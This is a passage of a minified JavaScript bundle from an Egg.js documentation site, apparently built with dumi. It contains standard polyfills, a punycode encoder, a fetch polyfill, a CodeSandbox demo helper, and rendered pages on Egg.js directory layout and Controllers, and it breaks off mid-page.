a=n("0mt+");a({target:"Math",stat:!0},{signbit:function(e){return(e=+e)==e&&0==e?1/e==-1/0:e<0}})},hzAS:function(e,t,n){"use strict";var a=n("0mt+"),r=n("9Rcy"),l=n("XejE"),o=n("m/os"),i=n("XaNN"),c=n("u3TI");r&&a({target:"Object",proto:!0,forced:l},{__defineSetter__:function(e,t){c.f(o(this),e,{set:i(t),enumerable:!0,configurable:!0})}})},iASg:function(e,t,n){"use strict";var a=n("/kpV")["default"];function r(){var e=n("FU0I");return r=function(){return e},e}function l(){var e=n("Qeuy");return l=function(){return e},e}function o(e,t){return d(e)||u(e,t)||c(e,t)||i()}function i(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function c(e,t){if(e){if("string"===typeof e)return s(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?s(e,t):void 0}}function s(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function u(e,t){var n=null==e?null:"undefined"!=typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l,o,i=[],c=!0,s=!1;try{if(l=(n=n.call(e)).next,0===t){if(Object(n)!==n)return;c=!1}else for(;!(c=(a=l.call(n)).done)&&(i.push(a.value),i.length!==t);c=!0);}catch(u){s=!0,r=u}finally{try{if(!c&&null!=n["return"]&&(o=n["return"](),Object(o)!==o))return}finally{if(s)throw r}}return i}}function d(e){if(Array.isArray(e))return e}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=void 0;var m="https://codesandbox.io/api/v1/sandboxes/define",p=function(e,t){return"react-dom"===e?"/**\n* This is an auto-generated demo by dumi\n* if you think it is not working as expected,\n* please report the issue at\n* https://github.com/umijs/dumi/issues\n**/\n    \nimport React from 'react';\nimport ReactDOM from 'react-dom';\n".concat(t,"\nimport App from './App';\n    \nReactDOM.render(\n  <App />,\n  document.getElementById('root'),\n);"):"react-dom/client"===e?"/**\n* This is an auto-generated demo by dumi\n* if you think it is not working as expected,\n* please report the issue at\n* https://github.com/umijs/dumi/issues\n**/\nimport React from 'react';\nimport { createRoot } from \"react-dom/client\";\n".concat(t,'\nimport App from "./App";\n\nconst rootElement = document.getElementById("root");\nconst root = createRoot(rootElement);\n\nroot.render(<App />);'):void 0};function h(e){var t=document.createElement("span");t.innerHTML=e;var n=t.textContent;return t.remove(),n}function g(e){var t,n=Boolean(e.sources._.tsx),r=n?".tsx":".jsx",o={},i={},c=Object.values(e.dependencies).filter((function(e){return e.css})),s="App".concat(r),u="index".concat(r);return Object.entries(e.dependencies).forEach((function(e){var t=a(e,2),n=t[0],r=t[1].version;i[n]=r})),i["react-dom"]||(i["react-dom"]=i.react||"latest"),o["sandbox.config.json"]={content:JSON.stringify({template:n?"create-react-app-typescript":"create-react-app"},null,2),isBinary:!1},o["package.json"]={content:JSON.stringify({name:e.title,description:h(e.description||"An auto-generated demo by dumi"),main:u,dependencies:i,devDependencies:n?{typescript:"^3"}:{}},null,2),isBinary:!1},o["index.html"]={content:'<div style="margin: 16px;" id="root"></div>',isBinary:!1},o[u]={content:p((null===i||void 0===i||null===(t=i["react-dom"])||void 0===t?void 0:t.startsWith("18."))||"latest"===i.react?"react-dom/client":"react-dom",c.map((function(e){var t=e.css;return"import '".concat(t,"';")})).join("\n")),isBinary:!1},Object.entries(e.sources).forEach((function(e){var t=a(e,2),n=t[0],r=t[1],l=r.tsx,i=r.jsx,c=r.content;o["_"===n?s:n]={content:l||i||c,isBinary:!1}})),(0,l().getParameters)({files:o})}var f=function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:m,n=(0,r().useState)(),a=o(n,2),l=a[0],i=a[1];return(0,r().useEffect)((function(){if(e){var n=document.createElement("form"),a=document.createElement("input"),r=g(e);return n.method="POST",n.target="_blank",n.style.display="none",n.action=t,n.appendChild(a),n.setAttribute("data-demo",e.title||""),a.name="parameters",a.value=r,document.body.appendChild(n),i((function(){return function(){return n.submit()}})),function(){return n.remove()}}}),[e]),l};t["default"]=f},iGuS:function(e,t,n){var a=n("u9el");a("Float32",(function(e){return function(t,n,a){return e(this,t,n,a)}}))},iWQo:function(e,t,n){"use strict";var a=2147483647,r=36,l=1,o=26,i=38,c=700,s=72,u=128,d="-",m=/[^\0-\u007E]/,p=/[.\u3002\uFF0E\uFF61]/g,h="Overflow: input needs wider integers to process",g=r-l,f=Math.floor,E=String.fromCharCode,b=function(e){var t=[],n=0,a=e.length;while(n<a){var r=e.charCodeAt(n++);if(r>=55296&&r<=56319&&n<a){var l=e.charCodeAt(n++);56320==(64512&l)?t.push(((1023&r)<<10)+(1023&l)+65536):(t.push(r),n--)}else t.push(r)}return t},v=function(e){return e+22+75*(e<26)},y=function(e,t,n){var a=0;for(e=n?f(e/c):e>>1,e+=f(e/t);e>g*o>>1;a+=r)e=f(e/g);return f(a+(g+1)*e/(e+i))},k=function(e){var t=[];e=b(e);var n,i,c=e.length,m=u,p=0,g=s;for(n=0;n<e.length;n++)i=e[n],i<128&&t.push(E(i));var k=t.length,w=k;k&&t.push(d);while(w<c){var x=a;for(n=0;n<e.length;n++)i=e[n],i>=m&&i<x&&(x=i);var j=w+1;if(x-m>f((a-p)/j))throw RangeError(h);for(p+=(x-m)*j,m=x,n=0;n<e.length;n++){if(i=e[n],i<m&&++p>a)throw RangeError(h);if(i==m){for(var S=p,C=r;;C+=r){var A=C<=g?l:C>=g+o?o:C-g;if(S<A)break;var L=S-A,T=r-A;t.push(E(v(A+L%T))),S=f(L/T)}t.push(E(v(S))),g=y(p,j,w==k),p=0,++w}}++p,++m}return t.join("")};e.exports=function(e){var t,n,a=[],r=e.toLowerCase().replace(p,".").split(".");for(t=0;t<r.length;t++)n=r[t],a.push(m.test(n)?"xn--"+k(n):n);return a.join(".")}},iXkl:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"In the ",r.a.createElement(l["Link"],{to:"../intro/quickstart"},"Quick Start"),", we should have a preliminary impression on the framework, next let us simply understand the directory convention specification."),r.a.createElement(o["a"],{code:"egg-project\n\u251c\u2500\u2500 package.json\n\u251c\u2500\u2500 app.js (optional)\n\u251c\u2500\u2500 agent.js (optional)\n\u251c\u2500\u2500 app\n|   \u251c\u2500\u2500 router.js\n\u2502   \u251c\u2500\u2500 controller\n\u2502   |   \u2514\u2500\u2500 home.js\n\u2502   \u251c\u2500\u2500 service (optional)\n\u2502   |   \u2514\u2500\u2500 user.js\n\u2502   \u251c\u2500\u2500 middleware (optional)\n\u2502   |   \u2514\u2500\u2500 response_time.js\n\u2502   \u251c\u2500\u2500 schedule (optional)\n\u2502   |   \u2514\u2500\u2500 my_task.js\n\u2502   \u251c\u2500\u2500 public (optional)\n\u2502   |   \u2514\u2500\u2500 reset.css\n\u2502   \u251c\u2500\u2500 view (optional)\n\u2502   |   \u2514\u2500\u2500 home.tpl\n\u2502   \u2514\u2500\u2500 extend (optional)\n\u2502       \u251c\u2500\u2500 helper.js (optional)\n\u2502       \u251c\u2500\u2500 request.js (optional)\n\u2502       \u251c\u2500\u2500 response.js (optional)\n\u2502       \u251c\u2500\u2500 context.js (optional)\n\u2502       \u251c\u2500\u2500 application.js (optional)\n\u2502       \u2514\u2500\u2500 agent.js (optional)\n\u251c\u2500\u2500 config\n|   \u251c\u2500\u2500 plugin.js\n|   \u251c\u2500\u2500 config.default.js\n\u2502   \u251c\u2500\u2500 config.prod.js\n|   \u251c\u2500\u2500 config.test.js (optional)\n|   \u251c\u2500\u2500 config.local.js (optional)\n|   \u2514\u2500\u2500 config.unittest.js (optional)\n\u2514\u2500\u2500 test\n    \u251c\u2500\u2500 middleware\n    |   \u2514\u2500\u2500 response_time.test.js\n    \u2514\u2500\u2500 controller\n        \u2514\u2500\u2500 home.test.js",lang:"bash"}),r.a.createElement("p",null,"As above, directories by conventions of framework:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app/router.js")," used to configure URL routing rules, see ",r.a.createElement(l["Link"],{to:"./router"},"Router")," for details."),r.a.createElement("li",null,r.a.createElement("code",null,"app/controller/**")," used to parse the input from user, return the corresponding results after processing, see ",r.a.createElement(l["Link"],{to:"./controller"},"Controller")," for details."),r.a.createElement("li",null,r.a.createElement("code",null,"app/service/**")," used for business logic layer, optional, recommend to use\uff0csee ",r.a.createElement(l["Link"],{to:"./service"},"Service")," for details."),r.a.createElement("li",null,r.a.createElement("code",null,"app/middleware/**")," uesd for middleware, optional, see ",r.a.createElement(l["Link"],{to:"./middleware"},"Middleware")," for details."),r.a.createElement("li",null,r.a.createElement("code",null,"app/public/**")," used to place static resources, optional, see built-in plugin ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-static"},"egg-static")," for details."),r.a.createElement("li",null,r.a.createElement("code",null,"app/extend/**")," used for extensions of the framework, optional, see ",r.a.createElement(l["Link"],{to:"./extend"},"Extend EGG")," for details."),r.a.createElement("li",null,r.a.createElement("code",null,"config/config.","{","env","}",".js")," used to write configuration files, see ",r.a.createElement(l["Link"],{to:"./config"},"Configuration")," for details."),r.a.createElement("li",null,r.a.createElement("code",null,"config/plugin.js")," used to configure the plugins that need to be loaded, see ",r.a.createElement(l["Link"],{to:"./plugin"},"Plugin")," for details."),r.a.createElement("li",null,r.a.createElement("code",null,"test/**")," used for unit test, see ",r.a.createElement(l["Link"],{to:"../core/unittest"},"Unit Test")," for details."),r.a.createElement("li",null,r.a.createElement("code",null,"app.js")," and ",r.a.createElement("code",null,"agent.js")," are used to customize the initialization works at startup, see ",r.a.createElement(l["Link"],{to:"./app-start"},"Application Startup Configuration")," for details. For the role of ",r.a.createElement("code",null,"agent.js")," see ",r.a.createElement(l["AnchorLink"],{to:"../core/cluster-and-ipc#agent-mechanism"},"Agent Mechanism"),".")),r.a.createElement("p",null,"Directories by conventions of built-in plugins:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app/public/**")," used to place static resources, optional, see built-in plugin ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-static"},"egg-static")," for details."),r.a.createElement("li",null,r.a.createElement("code",null,"app/schedule/**")," used for scheduled tasks, optional, see ",r.a.createElement(l["Link"],{to:"./schedule"},"Scheduled Task")," for details.")),r.a.createElement("p",null,r.a.createElement("strong",null,"To customize your own directory specification, see ",r.a.createElement(l["Link"],{to:"../advanced/loader"},"Loader API"))),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app/view/**")," used to place view files, optional, by view plugins conventions, see ",r.a.createElement(l["Link"],{to:"../core/view"},"View Rendering")," for details."),r.a.createElement("li",null,r.a.createElement("code",null,"app/model/**")," used to place the domain model, optional, by the domain related plugins conventions, such as ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-sequelize"},"egg-sequelize"),"."))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},iYqF:function(e,t,n){var a=n("lMVt"),r=n("QNwx"),l=n("dQn4"),o="[object Null]",i="[object Undefined]",c=a?a.toStringTag:void 0;function s(e){return null==e?void 0===e?i:o:c&&c in Object(e)?r(e):l(e)}e.exports=s},ieTO:function(e,t,n){var a=n("0mt+"),r=Math.hypot,l=Math.abs,o=Math.sqrt,i=!!r&&r(1/0,NaN)!==1/0;a({target:"Math",stat:!0,forced:i},{hypot:function(e,t){var n,a,r=0,i=0,c=arguments.length,s=0;while(i<c)n=l(arguments[i++]),s<n?(a=s/n,r=r*a*a+1,s=n):n>0?(a=n/s,r+=a*a):r+=n;return s===1/0?1/0:s*o(r)}})},ihx8:function(e,t,n){"use strict";var a=n("0mt+"),r=n("vr25").f,l=n("N0Us"),o=n("+7qM"),i=n("tS9j"),c=n("Pgx2"),s=n("m4/z"),u="".endsWith,d=Math.min,m=c("endsWith"),p=!s&&!m&&!!function(){var e=r(String.prototype,"endsWith");return e&&!e.writable}();a({target:"String",proto:!0,forced:!p&&!m},{endsWith:function(e){var t=String(i(this));o(e);var n=arguments.length>1?arguments[1]:void 0,a=l(t.length),r=void 0===n?a:d(l(n),a),c=String(e);return u?u.call(t,c,r):t.slice(r-c.length,r)===c}})},iiq2:function(e,t,n){(function(t){var n="object"==typeof t&&t&&t.Object===Object&&t;e.exports=n}).call(this,n("CwJZ"))},ikCq:function(e,t,n){"use strict";n.d(t,"a",(function(){return i}));var a=n("N/tQ"),r=n("sBM8"),l=n("b8/4"),o=n("jDmY");function i(e){return Object(a["a"])(e)||Object(r["a"])(e)||Object(l["a"])(e)||Object(o["a"])()}},"j+GT":function(e,t,n){"use strict";n.r(t),n.d(t,"Headers",(function(){return d})),n.d(t,"Request",(function(){return k})),n.d(t,"Response",(function(){return j})),n.d(t,"DOMException",(function(){return C})),n.d(t,"fetch",(function(){return A}));var a="undefined"!==typeof globalThis&&globalThis||"undefined"!==typeof self&&self||"undefined"!==typeof a&&a,r={searchParams:"URLSearchParams"in a,iterable:"Symbol"in a&&"iterator"in Symbol,blob:"FileReader"in a&&"Blob"in a&&function(){try{return new Blob,!0}catch(e){return!1}}(),formData:"FormData"in a,arrayBuffer:"ArrayBuffer"in a};function l(e){return e&&DataView.prototype.isPrototypeOf(e)}if(r.arrayBuffer)var o=["[object Int8Array]","[object Uint8Array]","[object Uint8ClampedArray]","[object Int16Array]","[object Uint16Array]","[object Int32Array]","[object Uint32Array]","[object Float32Array]","[object Float64Array]"],i=ArrayBuffer.isView||function(e){return e&&o.indexOf(Object.prototype.toString.call(e))>-1};function c(e){if("string"!==typeof e&&(e=String(e)),/[^a-z0-9\-#$%&'*+.^_`|~!]/i.test(e)||""===e)throw new TypeError('Invalid character in header field name: "'+e+'"');return e.toLowerCase()}function s(e){return"string"!==typeof e&&(e=String(e)),e}function u(e){var t={next:function(){var t=e.shift();return{done:void 0===t,value:t}}};return r.iterable&&(t[Symbol.iterator]=function(){return t}),t}function d(e){this.map={},e instanceof d?e.forEach((function(e,t){this.append(t,e)}),this):Array.isArray(e)?e.forEach((function(e){this.append(e[0],e[1])}),this):e&&Object.getOwnPropertyNames(e).forEach((function(t){this.append(t,e[t])}),this)}function m(e){if(e.bodyUsed)return Promise.reject(new TypeError("Already read"));e.bodyUsed=!0}function p(e){return new Promise((function(t,n){e.onload=function(){t(e.result)},e.onerror=function(){n(e.error)}}))}function h(e){var t=new FileReader,n=p(t);return t.readAsArrayBuffer(e),n}function g(e){var t=new FileReader,n=p(t);return t.readAsText(e),n}function f(e){for(var t=new Uint8Array(e),n=new Array(t.length),a=0;a<t.length;a++)n[a]=String.fromCharCode(t[a]);return n.join("")}function E(e){if(e.slice)return e.slice(0);var t=new Uint8Array(e.byteLength);return t.set(new Uint8Array(e)),t.buffer}function b(){return this.bodyUsed=!1,this._initBody=function(e){this.bodyUsed=this.bodyUsed,this._bodyInit=e,e?"string"===typeof e?this._bodyText=e:r.blob&&Blob.prototype.isPrototypeOf(e)?this._bodyBlob=e:r.formData&&FormData.prototype.isPrototypeOf(e)?this._bodyFormData=e:r.searchParams&&URLSearchParams.prototype.isPrototypeOf(e)?this._bodyText=e.toString():r.arrayBuffer&&r.blob&&l(e)?(this._bodyArrayBuffer=E(e.buffer),this._bodyInit=new Blob([this._bodyArrayBuffer])):r.arrayBuffer&&(ArrayBuffer.prototype.isPrototypeOf(e)||i(e))?this._bodyArrayBuffer=E(e):this._bodyText=e=Object.prototype.toString.call(e):this._bodyText="",this.headers.get("content-type")||("string"===typeof e?this.headers.set("content-type","text/plain;charset=UTF-8"):this._bodyBlob&&this._bodyBlob.type?this.headers.set("content-type",this._bodyBlob.type):r.searchParams&&URLSearchParams.prototype.isPrototypeOf(e)&&this.headers.set("content-type","application/x-www-form-urlencoded;charset=UTF-8"))},r.blob&&(this.blob=function(){var e=m(this);if(e)return e;if(this._bodyBlob)return Promise.resolve(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(new Blob([this._bodyArrayBuffer]));if(this._bodyFormData)throw new Error("could not read FormData body as blob");return Promise.resolve(new Blob([this._bodyText]))},this.arrayBuffer=function(){if(this._bodyArrayBuffer){var e=m(this);return e||(ArrayBuffer.isView(this._bodyArrayBuffer)?Promise.resolve(this._bodyArrayBuffer.buffer.slice(this._bodyArrayBuffer.byteOffset,this._bodyArrayBuffer.byteOffset+this._bodyArrayBuffer.byteLength)):Promise.resolve(this._bodyArrayBuffer))}return this.blob().then(h)}),this.text=function(){var e=m(this);if(e)return e;if(this._bodyBlob)return g(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(f(this._bodyArrayBuffer));if(this._bodyFormData)throw new Error("could not read FormData body as text");return Promise.resolve(this._bodyText)},r.formData&&(this.formData=function(){return this.text().then(w)}),this.json=function(){return this.text().then(JSON.parse)},this}d.prototype.append=function(e,t){e=c(e),t=s(t);var n=this.map[e];this.map[e]=n?n+", "+t:t},d.prototype["delete"]=function(e){delete this.map[c(e)]},d.prototype.get=function(e){return e=c(e),this.has(e)?this.map[e]:null},d.prototype.has=function(e){return this.map.hasOwnProperty(c(e))},d.prototype.set=function(e,t){this.map[c(e)]=s(t)},d.prototype.forEach=function(e,t){for(var n in this.map)this.map.hasOwnProperty(n)&&e.call(t,this.map[n],n,this)},d.prototype.keys=function(){var e=[];return this.forEach((function(t,n){e.push(n)})),u(e)},d.prototype.values=function(){var e=[];return this.forEach((function(t){e.push(t)})),u(e)},d.prototype.entries=function(){var e=[];return this.forEach((function(t,n){e.push([n,t])})),u(e)},r.iterable&&(d.prototype[Symbol.iterator]=d.prototype.entries);var v=["DELETE","GET","HEAD","OPTIONS","POST","PUT"];function y(e){var t=e.toUpperCase();return v.indexOf(t)>-1?t:e}function k(e,t){if(!(this instanceof k))throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');t=t||{};var n=t.body;if(e instanceof k){if(e.bodyUsed)throw new TypeError("Already read");this.url=e.url,this.credentials=e.credentials,t.headers||(this.headers=new d(e.headers)),this.method=e.method,this.mode=e.mode,this.signal=e.signal,n||null==e._bodyInit||(n=e._bodyInit,e.bodyUsed=!0)}else this.url=String(e);if(this.credentials=t.credentials||this.credentials||"same-origin",!t.headers&&this.headers||(this.headers=new d(t.headers)),this.method=y(t.method||this.method||"GET"),this.mode=t.mode||this.mode||null,this.signal=t.signal||this.signal,this.referrer=null,("GET"===this.method||"HEAD"===this.method)&&n)throw new TypeError("Body not allowed for GET or HEAD requests");if(this._initBody(n),("GET"===this.method||"HEAD"===this.method)&&("no-store"===t.cache||"no-cache"===t.cache)){var a=/([?&])_=[^&]*/;if(a.test(this.url))this.url=this.url.replace(a,"$1_="+(new Date).getTime());else{var r=/\?/;this.url+=(r.test(this.url)?"&":"?")+"_="+(new Date).getTime()}}}function w(e){var t=new FormData;return e.trim().split("&").forEach((function(e){if(e){var n=e.split("="),a=n.shift().replace(/\+/g," "),r=n.join("=").replace(/\+/g," ");t.append(decodeURIComponent(a),decodeURIComponent(r))}})),t}function x(e){var t=new d,n=e.replace(/\r?\n[\t ]+/g," ");return n.split("\r").map((function(e){return 0===e.indexOf("\n")?e.substr(1,e.length):e})).forEach((function(e){var n=e.split(":"),a=n.shift().trim();if(a){var r=n.join(":").trim();t.append(a,r)}})),t}function j(e,t){if(!(this instanceof j))throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');t||(t={}),this.type="default",this.status=void 0===t.status?200:t.status,this.ok=this.status>=200&&this.status<300,this.statusText=void 0===t.statusText?"":""+t.statusText,this.headers=new d(t.headers),this.url=t.url||"",this._initBody(e)}k.prototype.clone=function(){return new k(this,{body:this._bodyInit})},b.call(k.prototype),b.call(j.prototype),j.prototype.clone=function(){return new j(this._bodyInit,{status:this.status,statusText:this.statusText,headers:new d(this.headers),url:this.url})},j.error=function(){var e=new j(null,{status:0,statusText:""});return e.type="error",e};var S=[301,302,303,307,308];j.redirect=function(e,t){if(-1===S.indexOf(t))throw new RangeError("Invalid status code");return new j(null,{status:t,headers:{location:e}})};var C=a.DOMException;try{new C}catch(L){C=function(e,t){this.message=e,this.name=t;var n=Error(e);this.stack=n.stack},C.prototype=Object.create(Error.prototype),C.prototype.constructor=C}function A(e,t){return new Promise((function(n,l){var o=new k(e,t);if(o.signal&&o.signal.aborted)return l(new C("Aborted","AbortError"));var i=new XMLHttpRequest;function c(){i.abort()}function u(e){try{return""===e&&a.location.href?a.location.href:e}catch(t){return e}}i.onload=function(){var e={status:i.status,statusText:i.statusText,headers:x(i.getAllResponseHeaders()||"")};e.url="responseURL"in i?i.responseURL:e.headers.get("X-Request-URL");var t="response"in i?i.response:i.responseText;setTimeout((function(){n(new j(t,e))}),0)},i.onerror=function(){setTimeout((function(){l(new TypeError("Network request failed"))}),0)},i.ontimeout=function(){setTimeout((function(){l(new TypeError("Network request failed"))}),0)},i.onabort=function(){setTimeout((function(){l(new C("Aborted","AbortError"))}),0)},i.open(o.method,u(o.url),!0),"include"===o.credentials?i.withCredentials=!0:"omit"===o.credentials&&(i.withCredentials=!1),"responseType"in i&&(r.blob?i.responseType="blob":r.arrayBuffer&&o.headers.get("Content-Type")&&-1!==o.headers.get("Content-Type").indexOf("application/octet-stream")&&(i.responseType="arraybuffer")),!t||"object"!==typeof t.headers||t.headers instanceof d?o.headers.forEach((function(e,t){i.setRequestHeader(t,e)})):Object.getOwnPropertyNames(t.headers).forEach((function(e){i.setRequestHeader(e,s(t.headers[e]))})),o.signal&&(o.signal.addEventListener("abort",c),i.onreadystatechange=function(){4===i.readyState&&o.signal.removeEventListener("abort",c)}),i.send("undefined"===typeof o._bodyInit?null:o._bodyInit)}))}A.polyfill=!0,a.fetch||(a.fetch=A,a.Headers=d,a.Request=k,a.Response=j)},j00X:function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),Object.defineProperty(t,"AnchorLink",{enumerable:!0,get:function(){return o["default"]}}),Object.defineProperty(t,"Link",{enumerable:!0,get:function(){return r["default"]}}),Object.defineProperty(t,"NavLink",{enumerable:!0,get:function(){return l["default"]}}),Object.defineProperty(t,"context",{enumerable:!0,get:function(){return a["default"]}}),Object.defineProperty(t,"getDemoUrl",{enumerable:!0,get:function(){return p.getDemoUrl}}),Object.defineProperty(t,"useApiData",{enumerable:!0,get:function(){return h["default"]}}),Object.defineProperty(t,"useCodeSandbox",{enumerable:!0,get:function(){return d["default"]}}),Object.defineProperty(t,"useCopy",{enumerable:!0,get:function(){return c["default"]}}),Object.defineProperty(t,"useDemoUrl",{enumerable:!0,get:function(){return p["default"]}}),Object.defineProperty(t,"useLocaleProps",{enumerable:!0,get:function(){return m["default"]}}),Object.defineProperty(t,"useMotions",{enumerable:!0,get:function(){return u["default"]}}),Object.defineProperty(t,"usePrefersColor",{enumerable:!0,get:function(){return f["default"]}}),Object.defineProperty(t,"useRiddle",{enumerable:!0,get:function(){return s["default"]}}),Object.defineProperty(t,"useSearch",{enumerable:!0,get:function(){return i["default"]}}),Object.defineProperty(t,"useTSPlaygroundUrl",{enumerable:!0,get:function(){return g["default"]}});var a=v(n("D7X3")),r=v(n("EZPA")),l=v(n("JyiG")),o=v(n("Ejc3")),i=v(n("wsTr")),c=v(n("sA+K")),s=v(n("y2L3")),u=v(n("DXON")),d=v(n("iASg")),m=v(n("DESt")),p=b(n("lkDA")),h=v(n("vSEF")),g=v(n("C9r0")),f=v(n("BcEE"));function E(e){if("function"!==typeof WeakMap)return null;var t=new WeakMap,n=new WeakMap;return(E=function(e){return e?n:t})(e)}function b(e,t){if(!t&&e&&e.__esModule)return e;if(null===e||"object"!==typeof e&&"function"!==typeof e)return{default:e};var n=E(t);if(n&&n.has(e))return n.get(e);var a={},r=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var l in e)if("default"!==l&&Object.prototype.hasOwnProperty.call(e,l)){var o=r?Object.getOwnPropertyDescriptor(e,l):null;o&&(o.get||o.set)?Object.defineProperty(a,l,o):a[l]=e[l]}return a["default"]=e,n&&n.set(e,a),a}function v(e){return e&&e.__esModule?e:{default:e}}},j14B:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("h2",{id:"what-is-controller"},r.a.createElement(l["AnchorLink"],{to:"#what-is-controller","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"What is Controller"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"./router"},"The previous chapter")," says router is mainly used to describe the relationship between the request URL and the Controller that processes the request eventually, so what is a Controller used for?"),r.a.createElement("p",null,"Simply speaking, a Controller is used for ",r.a.createElement("strong",null,"parsing user's input and send back the relative result after processing"),", for example:"),r.a.createElement("ul",null,r.a.createElement("li",null,"In ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/Representational_state_transfer"},"RESTful")," interfaces, Controller accepts parameters from users and sends selected results back to user or modifies data in the database."),r.a.createElement("li",null,"In the HTML page requests, Controller renders related templates to HTML according to different URLs requested and then sends back to users."),r.a.createElement("li",null,"In the proxy servers, Controller transfers user's requests to other servers and sends back process results to users in return.")),r.a.createElement("p",null,"The framework recommends that the Controller layer is responsible for processing request parameters(verification and transformation) from user's requests, then calls related business methods in ",r.a.createElement(l["Link"],{to:"./service"},"Service"),", encapsulates and sends back business result:"),r.a.createElement("ol",null,r.a.createElement("li",null,"retrieves parameters passed by HTTP."),r.a.createElement("li",null,"verifies and assembles parameters."),r.a.createElement("li",null,"calls the Service to handle business, if necessary, transforms Service process results to satisfy user's requirement."),r.a.createElement("li",null,"sends results back to user by HTTP.")),r.a.createElement("h2",{id:"how-to-write-controller"},r.a.createElement(l["AnchorLink"],{to:"#how-to-write-controller","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How To Write Controller"),r.a.createElement("p",null,"All Controller files must be put under ",r.a.createElement("code",null,"app/controller")," directory, which can support multi-level directory. when accessing, cascading access can be done through directory names. Controllers can be written in various patterns depending on various project scenarios and development styles."),r.a.createElement("h3",{id:"controller-classrecommended"},r.a.createElement(l["AnchorLink"],{to:"#controller-classrecommended","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Controller Class(Recommended)"),r.a.createElement("p",null,"You can write a Controller by defining a Controller class:"),r.a.createElement(o["a"],{code:"// app/controller/post.js\nconst Controller = require('egg').Controller;\nclass PostController extends Controller {\n  async create() {\n    const { ctx, service } = this;\n    const createRule = {\n      title: { type: 'string' },\n      content: { type: 'string' },\n    };\n    // verify parameters\n    ctx.validate(createRule);\n    // assemble parameters\n    const author = ctx.session.userId;\n    const req = Object.assign(ctx.request.body, { author });\n    // calls Service to handle business\n    const res = await service.post.create(req);\n    // set response content and status code\n    ctx.body = { id: res.id };\n    ctx.status = 201;\n  }\n}\nmodule.exports = PostController;",lang:"js"}),r.a.createElement("p",null,"We've defined a ",r.a.createElement("code",null,"PostController")," class above and every method of this Controller can be used in Router, we can locate it from ",r.a.createElement("code",null,"app.controller")," according to the file name and the method name."),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.post('createPost', '/api/posts', controller.post.create);\n};",lang:"js"}),r.a.createElement("p",null,"Multi-level directory is supported, for example, put the above code into ",r.a.createElement("code",null,"app/controller/sub/post.js"),", then we could mount it by:"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.post('createPost', '/api/posts', app.controller.sub.post.create);\n};",lang:"js"}),r.a.createElement("p",null,"The defined Controller class will initialize a new object for every request when accessing the server, and some of the following attributes will be attached to ",r.a.createElement("code",null,"this")," since the Controller classes in the project are inherited from ",r.a.createElement("code",null,"egg.Controller"),"."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"this.ctx"),": the instance of ",r.a.createElement(l["AnchorLink"],{to:"./extend#context"},"Context")," for current request, through which we can access many attributes and methods encapsulated by the framework to handle current request conveniently."),r.a.createElement("li",null,r.a.createElement("code",null,"this.app"),": the instance of ",r.a.createElement(l["AnchorLink"],{to:"./extend#application"},"Application")," for current request, through which we can access global objects and methods provided by the framework."),r.a.createElement("li",null,r.a.createElement("code",null,"this.service"),": ",r.a.createElement(l["Link"],{to:"./service"},"Service")," defined by the application, through which we can access the abstract business layer, equivalent to ",r.a.createElement("code",null,"this.ctx.service"),"."),r.a.createElement("li",null,r.a.createElement("code",null,"this.config"),": the application's run-time ",r.a.createElement(l["Link"],{to:"./config"},"config"),"."),r.a.createElement("li",null,r.a.createElement("code",null,"this.logger"),"\uff1alogger with ",r.a.createElement("code",null,"debug"),"\uff0c",r.a.createElement("code",null,"info"),"\uff0c",r.a.createElement("code",null,"warn"),"\uff0c",r.a.createElement("code",null,"error"),", use to print different level log, is almost the same as ",r.a.createElement(l["AnchorLink"],{to:"../core/logger#context-logger"},"context logger"),", but it will append Controller file path for quickly 